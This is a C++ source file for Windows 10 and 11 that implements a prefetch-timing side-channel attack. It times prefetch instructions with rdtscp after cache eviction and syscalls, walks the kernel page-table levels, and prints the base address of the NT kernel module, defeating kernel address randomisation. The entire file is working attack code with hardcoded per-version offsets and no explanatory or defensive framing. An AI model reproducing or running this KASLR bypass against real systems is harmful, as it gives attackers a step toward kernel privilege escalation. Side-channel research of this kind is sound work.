#include <cstdio>
#include <cstdint>
#include <windows.h>
#include <vector>

#define KERNEL_ADDR_BASE 0xffff800000000000ull
#define PDPT_OFFSET (1ull<<39)
#define PD_OFFSET (1ull<<30)
#define PT_OFFSET (1ull<<21)
#define PG_OFFSET (1ull<<12)

#define WIN10_NTCALL_OFFSET 0xa19000
#define WIN11_NTCALL_OFFSET 0xaf6000
void *BigBuffer;
int nt_offset=0;
int pg_entry=0;
int hint_addr_num=0;
uint64_t nt_base_addr=0;

void syscall(){
    asm volatile("movq $0x005a,%%rax;"
                 "syscall;":::"memory");
}
void evict(){
    int temp;
    for(int i=0;i<1024*1024*4;i+=32){
        temp=*(int *)((uint64_t)BigBuffer+i);
    }
}

int get_average_time(const int times[],int num){
    int time=0;
    for(int i=0;i<num;i++){
        time+=times[i];
    }
    return time/num;
}

uint64_t measuretime(uint64_t addr){
    uint64_t a, b, c, d;
    asm volatile (
            "mfence;"
            "cpuid;"
            "rdtscp;"
            "movq %%rax, %0;"
            "movq %%rdx, %1;"
            "lfence;"
            "prefetchnta (%4);"
            "prefetcht2 (%4);"
            "xor %%rax, %%rax;"
            "lfence;"
            "rdtscp;"
            "movq %%rax, %2;"
            "movq %%rdx, %3;"
            "cpuid;"
            "mfence;"
            : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
            : "r" (addr)
            : "rax", "rbx", "rcx", "rdx", "memory"
            );
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

void gettimes(int loop,uint64_t addr,uint64_t page_offset,int times[],bool issyscall){

    uint64_t loop_addr;
    for(int i=0;i<10;i++){
        evict();
        for(int j=0;j<100;j++){
            for(int idx=0;idx<loop;idx++) {
                loop_addr =addr+ idx * page_offset;
                if(issyscall){
                    syscall();
                }
                int time = measuretime(loop_addr);
                if(time<times[idx]){
                    times[idx]=time;
                }
            }
        }
    }
}
std::vector<uint64_t> page_scan(const std::vector<uint64_t>& list_addr,int loop,int times[],int impact_factor,
                                uint64_t page_offset){
    std::vector<uint64_t> next_page;
    int average_time;
    for(auto item:list_addr){
        uint64_t addr=item;
        for(int i=0;i<loop;i++){
            times[i]=100000;
        }
        gettimes(loop,addr,page_offset,times,false);
        average_time= get_average_time(times,loop);
        //printf("average_time:%d\n",average_time);
        for(int i=0;i<loop;i++){
            //printf("addr:%llx  time:%d\n",addr+i*page_offset,times[i]);
            if(times[i]>(average_time+impact_factor)){
                next_page.push_back(addr+i*page_offset);
            }
        }
    }
    return next_page;
}
void scan(){
    //init
    uint64_t addr=KERNEL_ADDR_BASE;
    int times[512];
    BigBuffer= (void*) VirtualAlloc(NULL, 1024 * 1024 * 4,
                                    MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    std::vector<uint64_t> list_addr;
    list_addr.push_back(KERNEL_ADDR_BASE);

    //PDPT
    std::vector<uint64_t> pdpt_addr= page_scan(list_addr,256,times,10,PDPT_OFFSET);

//    for(auto item:pdpt_addr){
//        printf("PDPT:%llx\n",item);
//    }
    //PD
    std::vector<uint64_t> pd_addr= page_scan(pdpt_addr,512,times,15,PD_OFFSET);
//    for(auto item:pd_addr){
//        printf("PD:%llx\n",item);
//    }

    //PT
    std::vector<uint64_t> pt_addr= page_scan(pd_addr,512,times,15,PT_OFFSET);
//    for(auto item:pt_addr){
//        printf("PT:%llx\n",item);
//    }

    //PG
    std::vector<uint64_t> pg_addr;
    for(auto item:pt_addr){
        addr=item;
        for(int & time : times){
            time=100000;
        }
        gettimes(512,addr,PG_OFFSET,times,true);
        int min=10000;
        for(int time : times){
            if(time<min){
                min=time;
            }
        }
        for(int i=0;i<512;i++){
            if(times[i]==min){
                pg_addr.push_back(addr+i*PG_OFFSET);
            }
        }
    }

    for(auto item:pg_addr){
        if(((item>>12)%512)==pg_entry){
            hint_addr_num++;
            nt_base_addr=item-nt_offset;
        }
    }

}

int main(int argc, char* argv[]) {
    //get version
    int system_version=atoi(argv[1]);
    if(system_version==10){
        nt_offset=WIN10_NTCALL_OFFSET;
        pg_entry=0x19;
    }else if (system_version==11){
        nt_offset=WIN11_NTCALL_OFFSET;
        pg_entry=0xf6;
    }
    while(true){
        scan();
        if(hint_addr_num==1){
            printf("[*] nt moudle base addr:%llx\n",nt_base_addr);
            break;
        }
        hint_addr_num=0;
        nt_base_addr=0;
    }
    return 0;
}
